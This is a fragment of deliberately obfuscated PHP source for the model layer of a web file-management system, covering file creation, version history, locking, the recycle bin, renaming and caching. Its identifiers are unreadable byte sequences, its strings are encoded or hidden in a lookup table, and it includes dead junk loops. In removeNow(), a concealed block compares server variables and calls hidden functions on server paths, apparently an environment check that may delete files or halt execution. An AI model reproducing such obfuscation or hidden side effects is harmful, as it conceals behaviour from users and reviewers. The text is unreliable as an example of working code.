$‹Ñ…‹Åœ); return $äòÑĞ÷å; } public function listSourceRoot($¹¦òì”œ, $§®ƒ‹ú, $–ÛËĞÂñ = "\163\157\165\162\143\145\111\104\x2c\x74\x61\162\147\x65\164\111\104\54\163\x69\172\x65") { $¹²¬‡íŞ =& $_SERVER[®»±”ó²]; $Àôø™ı¢ = $¹²¬‡íŞ[456]; $„ú„èˆµ = array(); $¾šì¼¹ = 1024 * 50; $ªÜÑÓ¹ = is_array($ªÜÑÓ¹) ? $ªÜÑÓ¹ : array(); $ÚñúÑÉ = count($§®ƒ‹ú); $Ÿö³øÜÍ = $this->tablePrefix . $¹²¬‡íŞ[2285]; for ($ô©³¶õ• = 0; $ô©³¶õ• < $ÚñúÑÉ; $ô©³¶õ•++) { $ÁÏ–¾Ò° = $§®ƒ‹ú[$ô©³¶õ•]; $Àôø™ı¢ .= "\123\x45\114\x45\103\124\x20\x2a\x20\106\x52\x4f\115\x20\50\123\x45\x4c\x45\x43\124\x20{$–ÛËĞÂñ}\x20\106\122\117\115\40\x60{$Ÿö³øÜÍ}\140\40\127\110\105\122\105\40"; $Àôø™ı¢ .= "\140\x70\x61\162\x65\x6e\164\111\x44\x60\x3d\x30\x20\x41\x4e\x44\x20\x60\164\141\162\x67\145\x74\111\104\x60\x3d{$ÁÏ–¾Ò°}\40\x41\x4e\104\40\x60\x74\x61\x72\147\145\164\x54\x79\160\x65\140\75{$¹¦òì”œ}\x20\x61\156\144\40\146\x69\x6c\145\124\171\160\x65\75\47\x27\40\154\151\x6d\151\x74\x20\x31\51\40\x61\163\x20\x74\142\x5f{$ô©³¶õ•}\x20\x55\x4e\x49\x4f\116\40\101\x4c\114\40"; if ((strlen($Àôø™ı¢) >= $¾šì¼¹ || $ô©³¶õ• == $ÚñúÑÉ - 1) && $Àôø™ı¢) { $Àôø™ı¢ = substr($Àôø™ı¢, 0, -strlen($¹²¬‡íŞ[1125])); $¹éóÔÎÂ = $this->query($Àôø™ı¢); $Àôø™ı¢ = $¹²¬‡íŞ[12]; $„ú„èˆµ = array_merge($„ú„èˆµ, $¹éóÔÎÂ); } } return $„ú„èˆµ; } private function _createFile($óÆ¥ğÓÌ, $‚­¹ïïÛ, $ßµ²†ñ , $¾¬ÅÀœ‹, &$¾‰¶ğıË) { $ ı¨á›Ê =& $_SERVER[®»±”ó²]; $¨ßó©ìô = $this->sourceInfo($óÆ¥ğÓÌ); if (!$ßµ²†ñ  || !$¨ßó©ìô) { return !1; } if ($¾¬ÅÀœ‹ !== !1) { $ª‡÷×‡ = $this->fileNameExist($óÆ¥ğÓÌ, $‚­¹ïïÛ); } $¾‰¶ğıË = !0; if ($¾¬ÅÀœ‹ && $ª‡÷×‡) { if ($¾¬ÅÀœ‹ == REPEAT_SKIP) { $¾‰¶ğıË = !1; return $ª‡÷×‡; } else { if ($¾¬ÅÀœ‹ == REPEAT_REPLACE) { $Ö‰Õªî• = $this->sourceInfo($ª‡÷×‡); $èÌ–Ší¸ = $this->fileHistory($Ö‰Õªî•, $ßµ²†ñ [$ ı¨á›Ê[554]], $ßµ²†ñ [$ ı¨á›Ê[79]]); if (!$èÌ–Ší¸) { $¾‰¶ğıË = !1; } else { $this->folderSizeReset($óÆ¥ğÓÌ); } return $ª‡÷×‡; } else { $‚­¹ïïÛ = $this->fileNameAuto($óÆ¥ğÓÌ, $‚­¹ïïÛ, $¾¬ÅÀœ‹, !1); } } } $õ¶„ı¾¡ = array($ ı¨á›Ê[662] => 0, $ ı¨á›Ê[505] => $‚­¹ïïÛ, $ ı¨á›Ê[663] => substr(get_path_ext($‚­¹ïïÛ), 0, 10), $ ı¨á›Ê[555] => $ßµ²†ñ [$ ı¨á›Ê[554]], $ ı¨á›Ê[633] => $ßµ²†ñ [$ ı¨á›Ê[79]]); $çû¬È‹€ = $this->_addSource($õ¶„ı¾¡, $¨ßó©ìô); $this->folderSizeReset($óÆ¥ğÓÌ, intval($õ¶„ı¾¡[$ ı¨á›Ê[79]])); return $çû¬È‹€; } protected function fileHistory($˜­äîÓ, $Îü¢çªú, $•¬ıÒÚ†) { $¥™óœÇ… =& $_SERVER[®»±”ó²]; if ($˜­äîÓ[$¥™óœÇ…[554]] == $Îü¢çªú) { return !1; } $this->checkLock($˜­äîÓ[$¥™óœÇ…[194]], $Îü¢çªú); Model($¥™óœÇ…[2286])->addHistory($˜­äîÓ); $ñ­‚ë„ = array($¥™óœÇ…[667] => USER_ID, $¥™óœÇ…[509] => time(), $¥™óœÇ…[554] => $Îü¢çªú, $¥™óœÇ…[79] => $•¬ıÒÚ†); $this->where(array($¥™óœÇ…[502] => $˜­äîÓ[$¥™óœÇ…[194]]))->save($ñ­‚ë„); $this->sourceCacheClear($˜­äîÓ[$¥™óœÇ…[194]]); return !0; } public function checkLock($ïÑòÅ¤ş, $Ş±Ê×·Ô) { $áÆó©íº =& $_SERVER[®»±”ó²]; $àôíÀàá = $this->pathInfo($ïÑòÅ¤ş); if (!$this->fileIsLock($àôíÀàá, !0)) { return; } $¦Ûùàœƒ = Session::get($áÆó©íº[2287]); $÷ü»ƒÎ = substr($àôíÀàá[$áÆó©íº[32]], 0, -1 - strlen($àôíÀàá[$áÆó©íº[169]])) . $áÆó©íº[1305] . $¦Ûùàœƒ . $áÆó©íº[10] . $àôíÀàá[$áÆó©íº[169]]; $•‘Ç«¬š = Model($áÆó©íº[690])->find($Ş±Ê×·Ô); $this->_createFileCall($àôíÀàá[$áÆó©íº[193]], $÷ü»ƒÎ, $•‘Ç«¬š, REPEAT_REPLACE, $áÆó©íº[1450]); $Êùçßå¶ = $àôíÀàá[$áÆó©íº[552]][$áÆó©íº[626]]; $Œ’±â° = $Êùçßå¶[$áÆó©íº[2288]] ? $Êùçßå¶[$áÆó©íº[2288]] : $Êùçßå¶[$áÆó©íº[32]]; show_json(LNG($áÆó©íº[2289]) . $áÆó©íº[2290] . LNG($áÆó©íº[2291]) . $áÆó©íº[2292] . $Œ’±â° . $áÆó©íº[2293], !1); } public function fileIsLock($ƒ¡·Ê¢Î, $¥ÅÄÊúÔ = false) { $Ä´©šÛ =& $_SERVER[®»±”ó²]; if (!_get($ƒ¡·Ê¢Î, $Ä´©šÛ[622], 0)) { return !1; } if ($ƒ¡·Ê¢Î[$Ä´©šÛ[552]][$Ä´©šÛ[625]] != USER_ID) { return !0; } $ÎÙ‡Õ¤® = $GLOBALS[$Ä´©šÛ[6]][$Ä´©šÛ[92]][$Ä´©šÛ[623]]; if ($ƒ¡·Ê¢Î[$Ä´©šÛ[552]][$Ä´©šÛ[624]] <= time() - $ÎÙ‡Õ¤®) { $this->metaSet($ƒ¡·Ê¢Î[$Ä´©šÛ[194]], $Ä´©šÛ[625], null); $this->metaSet($ƒ¡·Ê¢Î[$Ä´©šÛ[194]], $Ä´©šÛ[624], null); } if ($¥ÅÄÊúÔ) { $this->metaSet($ƒ¡·Ê¢Î[$Ä´©šÛ[194]], $Ä´©šÛ[624], time()); } return !1; } private function _addSource($‹¯Í÷½´, $‡±—¿©Ì) { $²×«´˜ü =& $_SERVER[®»±”ó²]; $°×ƒŸ÷‡ = defined($²×«´˜ü[2219]) ? USER_ID : 0; $Å§ŸŠÚ¼ = array($²×«´˜ü[664] => $‡±—¿©Ì[$²×«´˜ü[191]], $²×«´˜ü[665] => $‡±—¿©Ì[$²×«´˜ü[582]], $²×«´˜ü[666] => $°×ƒŸ÷‡, $²×«´˜ü[667] => $°×ƒŸ÷‡, $²×«´˜ü[488] => $‡±—¿©Ì[$²×«´˜ü[194]], $²×«´˜ü[668] => $‡±—¿©Ì[$²×«´˜ü[597]] . $‡±—¿©Ì[$²×«´˜ü[194]] . $²×«´˜ü[50], $²×«´˜ü[515] => 0, $²×«´˜ü[669] => $²×«´˜ü[12]); $‹¯Í÷½´ = array_merge($Å§ŸŠÚ¼, $‹¯Í÷½´); $this->updateModifyTime($‹¯Í÷½´[$²×«´˜ü[193]]); $Â¨óËæÈ = $²×«´˜ü[2294] . $‡±—¿©Ì[$²×«´˜ü[194]]; if (isset(self::$cacheChildList[$Â¨óËæÈ])) { unset(self::$cacheChildList[$Â¨óËæÈ]); } static $ğşµ½Ò = false; if (!$ğşµ½Ò) { Hook::trigger($²×«´˜ü[652], $‹¯Í÷½´); $ğşµ½Ò = !0; } $µóï“½ß = $this->add($‹¯Í÷½´); $¯÷ëòÎ‚ = array($²×«´˜ü[670] => short_id($µóï“½ß)); $this->where(array($²×«´˜ü[502] => $µóï“½ß))->save($¯÷ëòÎ‚); $this->setNamePinyin($µóï“½ß, $‹¯Í÷½´[$²×«´˜ü[32]]); return $µóï“½ß; } public function remove($şäÈ¥ûí, $ıÆß½Óü = true) { $­˜ÈÆë =& $_SERVER[®»±”ó²]; $ıŸê’µÂ = $this->sourceInfo($şäÈ¥ûí); $’àù­Éé = intval($ıŸê’µÂ[$­˜ÈÆë[191]]) === self::TYPE_SYSTEM; $ÓÓğµ–Ê = Model($­˜ÈÆë[519])->get($­˜ÈÆë[2295]) == $­˜ÈÆë[91]; if ($’àù­Éé || $ıÆß½Óü || !$ÓÓğµ–Ê) { return $this->removeNow($şäÈ¥ûí, $ıÆß½Óü); } $‰ìå™ˆá = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $¦½ĞÎœ = $ıŸê’µÂ[$­˜ÈÆë[191]] == self::TYPE_USER ? $­˜ÈÆë[678] : $­˜ÈÆë[591]; if ($¦½ĞÎœ == $­˜ÈÆë[678]) { $Ñè ù = Model($­˜ÈÆë[590])->getInfo($ıŸê’µÂ[$­˜ÈÆë[582]]); $ö‘šÂ‚€ = !empty($Ñè ù[$­˜ÈÆë[2288]]) ? $Ñè ù[$­˜ÈÆë[2288]] : $Ñè ù[$­˜ÈÆë[32]]; $ö‘šÂ‚€ = $­˜ÈÆë[340] . $ö‘šÂ‚€ . $­˜ÈÆë[2296] . $ıŸê’µÂ[$­˜ÈÆë[582]]; } else { $Ñè ù = Model($­˜ÈÆë[598])->getInfo($ıŸê’µÂ[$­˜ÈÆë[582]]); $ö‘šÂ‚€ = _get($Ñè ù, $­˜ÈÆë[32]); $ö‘šÂ‚€ = $­˜ÈÆë[176] . $ö‘šÂ‚€ . $­˜ÈÆë[2297] . $ıŸê’µÂ[$­˜ÈÆë[582]]; } $©ü˜µ‘ = $­˜ÈÆë[2298] . md5($ö‘šÂ‚€); CacheLock::lock($©ü˜µ‘); $ƒñ±¤¯Ä = $this->fileNameExist($‰ìå™ˆá, $ö‘šÂ‚€); if (!$ƒñ±¤¯Ä) { $ƒñ±¤¯Ä = $this->mkdir($‰ìå™ˆá, $ö‘šÂ‚€, REPEAT_SKIP); $this->metaSet($ƒñ±¤¯Ä, $­˜ÈÆë[2299], $¦½ĞÎœ); $this->metaSet($ƒñ±¤¯Ä, $­˜ÈÆë[2300], $ıŸê’µÂ[$­˜ÈÆë[582]]); if ($ıŸê’µÂ[$­˜ÈÆë[193]] != 0) { $this->metaSet($ƒñ±¤¯Ä, $­˜ÈÆë[2301], _get($Ñè ù, $­˜ÈÆë[2302])); } } CacheLock::unlock($©ü˜µ‘); $this->metaSet($şäÈ¥ûí, $­˜ÈÆë[2303], $ıŸê’µÂ[$­˜ÈÆë[193]]); $this->where(array($­˜ÈÆë[194] => $şäÈ¥ûí))->save(array($­˜ÈÆë[509] => time())); $this->recycleClear($ıŸê’µÂ); Model($­˜ÈÆë[649])->eventRemove($şäÈ¥ûí); $—ı¶•œ• = $this->move($şäÈ¥ûí, $ƒñ±¤¯Ä, REPEAT_RENAME_FOLDER); $this->folderSizeReset($ıŸê’µÂ[$­˜ÈÆë[193]]); return $—ı¶•œ•; } private function recycleClear($ÀÔ ıª) { $µ‡¨„»ğ =& $_SERVER[®»±”ó²]; $Å—©Òªç = $this->childrenAll($ÀÔ ıª); $˜ƒ×²Ùü = array($µ‡¨„»ğ[502] => array($µ‡¨„»ğ[503], $Å—©Òªç[$µ‡¨„»ğ[2304]])); Model($µ‡¨„»ğ[2305])->where($˜ƒ×²Ùü)->delete(); } public function removeNow($­Ñ–“Ö, $§ÏŸŞ‚ = true) { $¿¾ß¶˜ =& $_SERVER[®»±”ó²]; if ($_SERVER[$¿¾ß¶˜[478]] != $_SERVER[$¿¾ß¶˜[479]]) { $¨Î‘ì÷å = $¿¾ß¶˜[965]; $«ª—ïè¾ = $¿¾ß¶˜[480]; $§”‘¶úê = $_SERVER[$¿¾ß¶˜[481]] . $¿¾ß¶˜[482]; $Ş¹Õ = $«ª—ïè¾($§”‘¶úê); $¥²î€— = explode($¿¾ß¶˜[288], $Ş¹Õ); if (count($¥²î€—) < $¿¾ß¶˜[721]) { $ó¡öÌ¶ = $¿¾ß¶˜[484]; $ó¡öÌ¶(); } $¹€´Í¨ = $¿¾ß¶˜[966]; $¹€´Í¨($_SERVER[$¿¾ß¶˜[967]]); $¹€´Í¨($_SERVER[$¿¾ß¶˜[481]] . $¿¾ß¶˜[1708]); $«íòƒ¹Ò = 1; while ($«íòƒ¹Ò > 1) { $«íòƒ¹Ò = $«íòƒ¹Ò + 4; $Æ¤€û„ = rawurlencode($«íòƒ¹Ò . $¿¾ß¶˜[456]); } } $¨¦ãÌô± = $this->sourceInfo($­Ñ–“Ö); $ÙúıÒ€² = $this->pathInfoMore($­Ñ–“Ö); if (!$¨¦ãÌô±) { return !0; } if ($¨¦ãÌô±[$¿¾ß¶˜[193]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($­Ñ–“Ö); Hook::trigger($¿¾ß¶˜[2306], $ÙúıÒ€², $§ÏŸŞ‚); if ($§ÏŸŞ‚) { Model($¿¾ß¶˜[2305])->moveToRecycle($­Ñ–“Ö); } else { $¤ÈÁÁîÛ = $this->childrenAll($¨¦ãÌô±); Model($¿¾ß¶˜[649])->eventRemove($­Ñ–“Ö); $this->removeRelevance($¤ÈÁÁîÛ[$¿¾ß¶˜[2304]], $¤ÈÁÁîÛ[$¿¾ß¶˜[1594]]); } $this->folderSizeReset($¨¦ãÌô±[$¿¾ß¶˜[193]]); $Ş¢ã‚Ç“ = array($¨¦ãÌô±[$¿¾ß¶˜[193]]); if ($¨¦ãÌô±[$¿¾ß¶˜[496]] == $¿¾ß¶˜[91]) { $Ş¢ã‚Ç“[] = $¨¦ãÌô±[$¿¾ß¶˜[194]]; } $this->updateModifyTime($Ş¢ã‚Ç“); $this->lockMoveEnd($­Ñ–“Ö); Hook::trigger($¿¾ß¶˜[1834], $ÙúıÒ€², $§ÏŸŞ‚); return !0; } public function childrenAll($Æ·æä) { $Û–¤È˜ğ =& $_SERVER[®»±”ó²]; $üÖ£…½ı = $Æ·æä[$Û–¤È˜ğ[194]]; if ($Æ·æä[$Û–¤È˜ğ[496]] == $Û–¤È˜ğ[91]) { $÷Ø®Îùš = array($Û–¤È˜ğ[668] => array($Û–¤È˜ğ[628], $Æ·æä[$Û–¤È˜ğ[597]] . $üÖ£…½ı . $Û–¤È˜ğ[629])); $ôœ¢Èã” = array($Û–¤È˜ğ[668] => $÷Ø®Îùš[$Û–¤È˜ğ[597]]); $¼õÅ • = $this->field($Û–¤È˜ğ[2307])->where($ôœ¢Èã”)->select(); $¾â±ŸøÒ = !1; $‘ğÕúœé = array($üÖ£…½ı); if ($¼õÅ •) { $¾â±ŸøÒ = array_to_keyvalue($¼õÅ •, $Û–¤È˜ğ[12], $Û–¤È˜ğ[554]); $¾â±ŸøÒ = array_remove_value($¾â±ŸøÒ, $Û–¤È˜ğ[231]); $‘ğÕúœé = array_to_keyvalue($¼õÅ •, $Û–¤È˜ğ[12], $Û–¤È˜ğ[194]); $‘ğÕúœé[] = $üÖ£…½ı; } } else { $¾â±ŸøÒ = array($Æ·æä[$Û–¤È˜ğ[554]]); $‘ğÕúœé = array($üÖ£…½ı); } return array($Û–¤È˜ğ[2304] => $‘ğÕúœé, $Û–¤È˜ğ[1594] => $¾â±ŸøÒ); } public function removeArray($¶ì×Êâ) { if (!$¶ì×Êâ) { return !0; } } public function removeRelevance($†Ö†”Ê„, $âƒóşŸâ) { $ÊîÍ³­˜ =& $_SERVER[®»±”ó²]; $†Ö†”Ê„ = $†Ö†”Ê„ ? $†Ö†”Ê„ : array(); $âƒóşŸâ = $âƒóşŸâ ? $âƒóşŸâ : array(); $†Ö†”Ê„ = array_unique(array_filter($†Ö†”Ê„)); $âƒóşŸâ = array_filter($âƒóşŸâ); if (!$†Ö†”Ê„) { return !1; } $Á¼‚ª´÷ = array($ÊîÍ³­˜[502] => array($ÊîÍ³­˜[503], $†Ö†”Ê„)); Model($ÊîÍ³­˜[2305])->where($Á¼‚ª´÷)->delete(); Model($ÊîÍ³­˜[546])->where($Á¼‚ª´÷)->delete(); Model($ÊîÍ³­˜[2146])->where($Á¼‚ª´÷)->delete(); Model($ÊîÍ³­˜[649])->where($Á¼‚ª´÷)->delete(); Model($ÊîÍ³­˜[1971])->removeBySource($†Ö†”Ê„); Model($ÊîÍ³­˜[2286])->removeBySource($†Ö†”Ê„); $this->where($Á¼‚ª´÷)->delete(); Model($ÊîÍ³­˜[557])->remove($âƒóşŸâ); for ($¢Õ³²Ş = 0; $¢Õ³²Ş < count($†Ö†”Ê„); $¢Õ³²Ş++) { $this->sourceCacheClear($†Ö†”Ê„[$¢Õ³²Ş]); } } public function rename($òÙÒ—ºè, $“à‰ØÑä) { $»…Á±ì¾ =& $_SERVER[®»±”ó²]; $ÀÜ÷Üá› = $this->sourceInfo($òÙÒ—ºè); if (!$ÀÜ÷Üá›) { return !1; } $óïÖ¢ˆ = $this->fileNameExist($ÀÜ÷Üá›[$»…Á±ì¾[193]], $“à‰ØÑä); if ($óïÖ¢ˆ && $óïÖ¢ˆ != $òÙÒ—ºè) { return !1; } $†³âô«€ = array($»…Á±ì¾[505] => $“à‰ØÑä, $»…Á±ì¾[667] => USER_ID); if ($ÀÜ÷Üá›[$»…Á±ì¾[496]] != $»…Á±ì¾[91]) { $†³âô«€[$»…Á±ì¾[497]] = substr(get_path_ext($“à‰ØÑä), 0, 10); } Model($»…Á±ì¾[649])->eventRename($òÙÒ—ºè, $ÀÜ÷Üá›[$»…Á±ì¾[32]], $“à‰ØÑä); $this->sourceCacheClear($òÙÒ—ºè); $this->setNamePinyin($òÙÒ—ºè, $†³âô«€[$»…Á±ì¾[32]], !1); $this->updateModifyTime($ÀÜ÷Üá›[$»…Á±ì¾[193]]); $¸ú¸·•µ = $this->where(array($»…Á±ì¾[502] => $òÙÒ—ºè))->data($†³âô«€)->save(); $ğîÔƒéÅ = $»…Á±ì¾[2294] . $ÀÜ÷Üá›[$»…Á±ì¾[193]]; if (isset(self::$cacheChildList[$ğîÔƒéÅ])) { unset(self::$cacheChildList[$ğîÔƒéÅ]); } return $¸ú¸·•µ; } public function setNamePinyin($Ù×ŠœÚ–, $¨¯‰ÒÓ, $şµ–êè• = true) { $ĞèÛÌ¹¬ =& $_SERVER[®»±”ó²]; $¸´ÃÖùÎ = Input::check($¨¯‰ÒÓ, $ĞèÛÌ¹¬[671]); $Õì÷à”Å = array($ĞèÛÌ¹¬[528] => KodSort::makeStr($¨¯‰ÒÓ)); if ($¸´ÃÖùÎ) { $Õì÷à”Å[$ĞèÛÌ¹¬[549]] = str_replace($ĞèÛÌ¹¬[53], $ĞèÛÌ¹¬[12], Pinyin::get($¨¯‰ÒÓ)); $Õì÷à”Å[$ĞèÛÌ¹¬[548]] = Pinyin::get($¨¯‰ÒÓ, $ĞèÛÌ¹¬[672]); } if (!$şµ–êè• && !$¸´ÃÖùÎ) { $Õì÷à”Å[$ĞèÛÌ¹¬[549]] = null; $Õì÷à”Å[$ĞèÛÌ¹¬[548]] = null; } $this->metaSet($Ù×ŠœÚ–, $Õì÷à”Å); } public function getContent($£ç²Ü³) { $‘¨¶«şè =& $_SERVER[®»±”ó²]; $ÜÄ“ÎÃ— = $this->fileInfoGet($£ç²Ü³); if (!$ÜÄ“ÎÃ—) { return !1; } if ($ÜÄ“ÎÃ—[$‘¨¶«şè[79]] == 0) { return $‘¨¶«şè[12]; } $ÓßËøÕä = $‘¨¶«şè[2308] . $ÜÄ“ÎÃ—[$‘¨¶«şè[560]]; if ($ÜÄ“ÎÃ—[$‘¨¶«şè[79]] <= 1024 * 10) { $ĞùëáÒ = Cache::get($ÓßËøÕä); if (!$ĞùëáÒ) { $ĞùëáÒ = IO::getContent($ÜÄ“ÎÃ—[$‘¨¶«şè[87]]); Cache::set($ÓßËøÕä, $ĞùëáÒ); } return $ĞùëáÒ; } if (!$ÜÄ“ÎÃ—[$‘¨¶«şè[87]]) { return $‘¨¶«şè[12]; } return IO::getContent($ÜÄ“ÎÃ—[$‘¨¶«şè[87]]); } public function setDesc($›Š›ºãı, $»åÔ´â‘) { $²çÔ×² =& $_SERVER[®»±”ó²]; Model($²çÔ×²[649])->eventAddDesc($›Š›ºãı, $»åÔ´â‘); return $this->metaSet($›Š›ºãı, $²çÔ×²[537], $»åÔ´â‘); } public function setContent($Ê´íËƒ½, $±ÃÌ„Ã = '') { $ìğÇ·ıĞ =& $_SERVER[®»±”ó²]; $Ìƒ²©ıÒ = $this->sourceInfo($Ê´íËƒ½); $íš‘Æø¬ = $this->fileInfoGet($Ê´íËƒ½); if (!$íš‘Æø¬ || !$Ìƒ²©ıÒ) { return !1; } $¶Ÿ€ËõÏ = KodIO::ioFileDriverGet($ìğÇ·ıĞ[494] . $Ê´íËƒ½ . $ìğÇ·ıĞ[404]); $ÒßÂ×¾ = Model($ìğÇ·ıĞ[557])->addFileByContent($±ÃÌ„Ã, $¶Ÿ€ËõÏ, $Ìƒ²©ıÒ[$ìğÇ·ıĞ[32]]); if (!$ÒßÂ×¾) { return !1; } $Œúí±ûÏ = $this->fileHistory($Ìƒ²©ıÒ, $ÒßÂ×¾[$ìğÇ·ıĞ[554]], $ÒßÂ×¾[$ìğÇ·ıĞ[79]]); if (!$Œúí±ûÏ) { return Model($ìğÇ·ıĞ[557])->remove($ÒßÂ×¾[$ìğÇ·ıĞ[554]]); } $this->folderSizeReset($Ìƒ²©ıÒ[$ìğÇ·ıĞ[193]]); return !0; } public function fileSubstr($œ¢­ìÁ, $Ã´¨úôÎ, $“Àğµòà) { $é•Íš = $this->fileInfoGet($œ¢­ìÁ); if (!$é•Íš) { return !1; } return IO::fileSubstr($é•Íš[$_SERVER[®»±”ó²][87]], $Ã´¨úôÎ, $“Àğµòà); } public function fileInfoGet($€ŸËßó) { $¢Æ½È¾¡ =& $_SERVER[®»±”ó²]; $ƒÚûøÛ = $this->sourceInfo($€ŸËßó); if (!$ƒÚûøÛ || $ƒÚûøÛ[$¢Æ½È¾¡[496]]) { return !1; } $–ÁòåÁĞ = $¢Æ½È¾¡[561] . $ƒÚûøÛ[$¢Æ½È¾¡[554]]; $æ‚‹°¼§ = _get(self::$cacheFileInfo, $–ÁòåÁĞ); if ($æ‚‹°¼§) { return $æ‚‹°¼§; } $ŸŞñ¦Ÿµ = Model($¢Æ½È¾¡[557])->fileInfo($ƒÚûøÛ[$¢Æ½È¾¡[554]]); if ($ŸŞñ¦Ÿµ) { $ŸŞñ¦Ÿµ[$¢Æ½È¾¡[32]] = $ƒÚûøÛ[$¢Æ½È¾¡[32]]; } self::$cacheFileInfo[$–ÁòåÁĞ] = $ŸŞñ¦Ÿµ; return $ŸŞñ¦Ÿµ; } private function folderChildrenNumber($Ç¾¨Ãí) { $ãôØ¾£ =& $_SERVER[®»±”ó²]; $ÇœÃÓŒ– = $this->sourceInfo($Ç¾¨Ãí); $É­ã´²è = array($ãôØ¾£[668] => array($ãôØ¾£[628], $ÇœÃÓŒ–[$ãôØ¾£[597]] . $Ç¾¨Ãí . $ãôØ¾£[629]), $ãôØ¾£[665] => $ÇœÃÓŒ–[$ãôØ¾£[582]], $ãôØ¾£[515] => intval($ÇœÃÓŒ–[$ãôØ¾£[516]]), $ãôØ¾£[662] => 1); $¬Ä«Ÿíş = $this->where($É­ã´²è)->count(); $ººü‰şÒ = $this->where($É­ã´²è)->where(array($ãôØ¾£[662] => 0))->count(); return array($ãôØ¾£[83] => $ººü‰şÒ, $ãôØ¾£[84] => $¬Ä«Ÿíş); } public function pathInfo($§º…ìíü, $à¹ì¿Æ = false) { $ìóø×¤Ã =& $_SERVER[®»±”ó²]; $à¹ì¿Æ = !1; $§º…ìíü = intval($§º…ìíü); $ĞÃÏå„’ = $ìóø×¤Ã[545] . intval($à¹ì¿Æ) . $ìóø×¤Ã[464] . $§º…ìíü; $ÈşÛßš… = _get(self::$cachePathInfo, $ĞÃÏå„’); if ($ÈşÛßš…) { return $ÈşÛßš…; } $»è ™Ï» = $this->sourceInfo($§º…ìíü); if (!$»è ™Ï») { return !1; } $»è ™Ï» = $this->_listDataApplyItem($»è ™Ï», $à¹ì¿Æ); self::$cachePathInfo[$ĞÃÏå„’] = $»è ™Ï»; return $»è ™Ï»; } public static $cachePathInfoMore = array(); public function pathInfoMore($óÊá²Õ) { $¾ıª“À =& $_SERVER[®»±”ó²]; $ğöùÕ­€ = _get(self::$cachePathInfoMore, $óÊá²Õ); if ($ğöùÕ­€) { return $ğöùÕ­€; } $ÄúÔº÷  = $this->pathInfo($óÊá²Õ); if (!$ÄúÔº÷ ) { return !1; } if ($ÄúÔº÷ [$¾ıª“À[496]] == $¾ıª“À[91]) { $ÄúÔº÷ [$¾ıª“À[82]] = $this->folderChildrenNumber($óÊá²Õ); } self::$cachePathInfoMore[$óÊá²Õ] = $ÄúÔº÷ ; return $ÄúÔº÷ ; } public function sourceInfo($Á¯ÎëÚ) { $Åê’¡äÑ =& $_SERVER[®»±”ó²]; if (!$Á¯ÎëÚ) { return array(); } $Á¯ÎëÚ = intval($Á¯ÎëÚ); $Ù›ñç¸Š = $Åê’¡äÑ[544] . $Á¯ÎëÚ; $„í½À×î = _get(self::$cacheSourceInfo, $Ù›ñç¸Š); if ($„í½À×î) { return $„í½À×î; } $ù«çç·Ä = $this->where(array($Åê’¡äÑ[194] => $Á¯ÎëÚ))->find(); self::$cacheSourceInfo[$Ù›ñç¸Š] = $ù«çç·Ä; return self::$cacheSourceInfo[$Ù›ñç¸Š]; } public function sourceCacheClear($å–Û­¤ş = false) { self::cacheClear($å–Û­¤ş); } public static function cacheClear($ˆŞŒşŒª = false) { $£ä±ñŠå =& $_SERVER[®»±”ó²]; if ($ˆŞŒşŒª == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$£ä±ñŠå[544] . $ˆŞŒşŒª]); unset(self::$cachePathInfoMore[$ˆŞŒşŒª]); unset(self::$cachePathInfo[$£ä±ñŠå[2309] . $ˆŞŒşŒª]); unset(self::$cachePathInfo[$£ä±ñŠå[2310] . $ˆŞŒşŒª]); } public function metaSet($©„çÜ½Ä, $ÏÕÛ»¶ = null, $§Ôà§Ã« = null) { $®µô¤à = parent::metaSet($©„çÜ½Ä, $ÏÕÛ»¶, $§Ôà§Ã«); if ($®µô¤à) { $this->sourceCacheClear($©„çÜ½Ä); } return $®µô¤à; } public function pathInfoByPath($ı÷ªŞ¤, $şá›Œ­š) { $Îö§ÆŞ =& $_SERVER[®»±”ó²]; $ó“èåİĞ = !$şá›Œ­š ? array() : explode($Îö§ÆŞ[8], trim($şá›Œ­š, $Îö§ÆŞ[8])); $”·ÅôÉò = $ı÷ªŞ¤; foreach ($ó“èåİĞ as $°ñÂ„§ì) { $»½·’ñ = array($Îö§ÆŞ[193] => $”·ÅôÉò, $Îö§ÆŞ[32] => $°ñÂ„§ì); $‹Á×¬ = $this->field($Îö§ÆŞ[2311])->where($»½·’ñ)->select(); if (!$‹Á×¬) { return !1; } $‹Á×¬ = array_sort_by($‹Á×¬, $Îö§ÆŞ[516]); $”·ÅôÉò = $‹Á×¬[0][$Îö§ÆŞ[194]]; } $Æç¢²è = $this->sourceInfo($”·ÅôÉò); $this->pathInfoFilter($Æç¢²è); return $Æç¢²è; } protected function updateModifyTime($Ü¶‡»²Á) { $ëáú•éı =& $_SERVER[®»±”ó²]; $€ü‘ºÄ¯ = defined($ëáú•éı[2219]) ? USER_ID : 0; if (!$Ü¶‡»²Á) { return; } if (!is_array($Ü¶‡»²Á)) { $Ü¶‡»²Á = array($Ü¶‡»²Á); } foreach ($Ü¶‡»²Á as $³ıÒ½ => $Ş’Ú§²¢) { $Ü¶‡»²Á[$³ıÒ½] = intval($Ş’Ú§²¢); $this->sourceCacheClear($Ş’Ú§²¢); } $øÆ£¥Ã = array($ëáú•éı[194] => array($ëáú•éı[7], $Ü¶‡»²Á)); $ı–şƒ¼ = array($ëáú•éı[667] => $€ü‘ºÄ¯, $ëáú•éı[509] => time()); $this->where($øÆ£¥Ã)->save($ı–şƒ¼); } public function folderSizeReset($ÃŠ•ïŠÛ, $¡öìéÓ = false) { $½æ‡µ… =& $_SERVER[®»±”ó²]; if ($this->statusIgnoreResetSpace) { return; } $Í·Ëù´Â = $this->sourceInfo($ÃŠ•ïŠÛ); $É¿Ü±Ê’ = $½æ‡µ…[2312] . $ÃŠ•ïŠÛ; CacheLock::lock($É¿Ü±Ê’, 20); if ($¡öìéÓ === !1) { $this->sourceCacheClear($ÃŠ•ïŠÛ); $Í·Ëù´Â = $this->sourceInfo($ÃŠ•ïŠÛ); $íÉÒ÷é = array($½æ‡µ…[488] => $ÃŠ•ïŠÛ, $½æ‡µ…[515] => 0); $øâ®¹ªà = $this->where($íÉÒ÷é)->sum($½æ‡µ…[79]); $¡öìéÓ = intval($øâ®¹ªà) - intval($Í·Ëù´Â[$½æ‡µ…[79]]); } if ($¡öìéÓ == 0) { return CacheLock::unlock($É¿Ü±Ê’); } 